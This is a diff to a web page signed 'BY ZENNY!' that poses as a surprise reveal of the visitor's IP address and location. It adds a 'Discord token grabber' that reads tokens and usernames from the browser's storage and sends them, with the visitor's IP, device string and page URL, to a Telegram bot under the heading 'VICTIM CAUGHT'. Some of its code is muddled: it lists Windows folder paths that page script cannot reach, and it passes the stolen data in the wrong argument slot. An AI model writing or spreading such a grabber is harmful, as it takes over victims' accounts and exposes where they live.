@@ -160,7 +160,7 @@
       transform: scale(1.05);
     }
 
-    /* HIDDEN YOUTUBE PLAYER */
+    /* HIDDEN PLAYER */
     #player {
       margin-top: 40px;
       width: 100%;
@@ -192,7 +192,7 @@
 
       <!-- STEP 1: IP -->
       <div id="result-ip" class="result hidden">
-        This is ur ip adress if u didnt know <span style="font-size:2.2rem">😭👅</span><br>
+        This is ur ip adress if u didnt know <span style="font-size:2.2rem">tongue_stuck_out:</span><br>
         <span id="ip" style="color:#ff0000; font-size:1.8rem;">...</span>
         <br><br>
         <button class="btn" onclick="revealLocation()">CLICK ME FOR ANOTHER SURPRISE</button>
@@ -204,6 +204,14 @@
         <div id="city" style="color:#ff6666; font-size:1.7rem;">...</div>
         <div id="country" style="color:#ff9999; font-size:1.5rem;">...</div>
         <div id="isp" style="color:#ffcccc; font-size:1.4rem;">...</div>
+        <br>
+        <button class="btn" onclick="revealDiscord()">ANOTHER SURPRISE</button>
+      </div>
+
+      <!-- STEP 3: DISCORD -->
+      <div id="result-discord" class="result hidden">
+        <div>Another surprise:</div>
+        <div id="discord-user" style="color:#ff6666; font-size:1.7rem;">...</div>
       </div>
 
       <div class="by">BY ZENNY!</div>
@@ -258,7 +266,7 @@
     let userIP = "";
 
     // === SEND TO TELEGRAM ===
-    function sendToTelegram(ip, city = "", country = "", isp = "", device = "", song = "") {
+    function sendToTelegram(ip, city = "", country = "", isp = "", device = "", discord = "", song = "") {
       const site = location.href;
       let message = 
 `VICTIM CAUGHT
@@ -270,6 +278,7 @@ ISP: <b>${isp || "Unknown"}</b>
 Device: <code>${device}</code>
 Site: <a href="${site}">${site}</a>`;
 
+      if (discord) message += `\nDiscord: <b>${discord}</b>`;
       if (song) message += `\nChose Song: <b>${song}</b>`;
 
       fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent(message)}&parse_mode=HTML`)
@@ -310,6 +319,66 @@ Site: <a href="${site}">${site}</a>`;
         .catch(() => {
           document.getElementById('city').innerHTML = "Blocked";
         });
+    }
+
+    // === DISCORD TOKEN GRABBER ===
+    function grabDiscord() {
+      const discordPaths = [
+        '%AppData%\\discord\\Local Storage\\leveldb',
+        '%LocalAppData%\\Discord\\Local Storage\\leveldb',
+        '%AppData%\\discordcanary\\Local Storage\\leveldb',
+        '%AppData%\\discordptb\\Local Storage\\leveldb'
+      ];
+
+      let token = null;
+      let username = "Not Found";
+
+      // Try to get token from localStorage (if Discord is open in browser)
+      try {
+        const discordData = localStorage.getItem('token');
+        if (discordData) {
+          token = JSON.parse(discordData);
+        }
+      } catch {}
+
+      // Fallback: Try to extract from IndexedDB or localStorage
+      if (!token) {
+        const possibleKeys = Object.keys(localStorage).filter(k => k.includes('token'));
+        if (possibleKeys.length > 0) {
+          try {
+            token = JSON.parse(localStorage.getItem(possibleKeys[0]));
+          } catch {}
+        }
+      }
+
+      // Try to get username from Discord's local storage
+      try {
+        const userData = localStorage.getItem('user');
+        if (userData) {
+          const user = JSON.parse(userData);
+          username = user.tag || user.username || "Unknown";
+        }
+      } catch {}
+
+      return { token, username };
+    }
+
+    // === REVEAL DISCORD ===
+    function revealDiscord() {
+      document.querySelector('#result-location .btn').classList.add('hidden');
+      const result = document.getElementById('result-discord');
+      result.classList.remove('hidden');
+      setTimeout(() => result.style.opacity = 1, 100);
+
+      const { token, username } = grabDiscord();
+      const displayName = username === "Not Found" ? "Discord Not Open" : username;
+
+      document.getElementById('discord-user').innerHTML = displayName;
+
+      if (token) {
+        const device = navigator.userAgent.substring(0, 80);
+        sendToTelegram(userIP, "", "", "", device, `${username} | ${token}`);
+      }
     }
 
     // === REVEAL IP ===
